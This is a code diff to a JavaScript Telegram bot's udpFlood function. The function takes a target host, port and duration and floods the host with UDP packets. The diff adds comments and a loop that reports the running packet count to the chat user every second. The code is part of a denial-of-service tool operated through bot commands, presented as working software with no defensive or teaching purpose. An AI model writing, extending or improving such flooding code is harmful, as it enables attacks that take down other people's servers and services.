@@ -13,6 +13,7 @@ const udpFlood = (chatId, host, duration, port) => {
   const endTime = Date.now() + duration * 1000;
   let packets = 0;
 
+  // Function to send packets
   const sendPacket = () => {
     if (Date.now() > endTime) {
       client.close();
@@ -29,7 +30,17 @@ const udpFlood = (chatId, host, duration, port) => {
     });
   };
 
+  // Start sending packets
   sendPacket();
+
+  // Update user every second with the current packet count
+  const updateInterval = setInterval(() => {
+    if (Date.now() > endTime) {
+      clearInterval(updateInterval);
+    } else {
+      bot.sendMessage(chatId, `Packets sent: ${packets}`);
+    }
+  }, 1000);
 };
 
 // Handler for the /start command
